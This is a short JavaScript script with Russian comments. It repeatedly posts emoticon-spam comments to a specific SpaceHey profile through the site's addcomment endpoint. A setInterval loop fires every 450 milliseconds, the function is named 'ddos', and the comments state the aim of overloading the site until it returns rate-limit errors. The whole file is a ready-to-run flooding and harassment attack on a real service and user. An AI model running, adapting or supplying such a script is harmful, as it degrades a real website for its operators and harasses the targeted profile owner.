function getXmlHttp() {
var xmlhttp;
try {
xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
} catch (e) {
try {
xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
} catch (E) {
xmlhttp = false;
}
}
if (!xmlhttp && typeof XMLHttpRequest!='undefined') {
xmlhttp = new XMLHttpRequest();
}
return xmlhttp;
}
function ddos() {

var id =136435; // id профиля Spacehey
var xmlhttp = getXmlHttp(); 
xmlhttp.open('POST', 'https://spacehey.com/addcomment?id='+id, true); // Создаем соединение к странице отправки комментария
xmlhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); // Отправляем кодировку
xmlhttp.send('comment=:):(:P:o👍👎 :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 ;) ;) ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) ):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) ;) ;) :):(:P:o👍👎 ;) ;) ;) ;) ;) ;) ;) :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) ;) ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) ;) ;) ;) ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) ;) ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) ;) ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) ;) ;) ;) ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 ;) ;) ;) ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) ;) :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) ;) ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) ;) ;) ;) ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 ;) ;) ;) ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 ;) ;) ;) ;) ;) :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 ;) ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 ;) ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 :):(:P:o👍👎 ;) ;)&submit='); // Отправляем POST-запрос с текстом комментария
xmlhttp.onreadystatechange = function() { // Ждём ответа от сервера
if (xmlhttp.readyState == 4) { // Ответ пришёл
if(xmlhttp.status == 200) { // Ответ к серверу выполнен успешно
console.log("Комментарий отправлен!"); // Комментарий успешно отправлен
}
if(xmlhttp.status ==429)
{ //Превышение запроса к серверу,сайт плохо работает при больших запросах
  console.log("Сайт положен запросами");
}
}
};
} setInterval(ddos,450);//повторяем цикл функции ддос через 450 миллисекунд
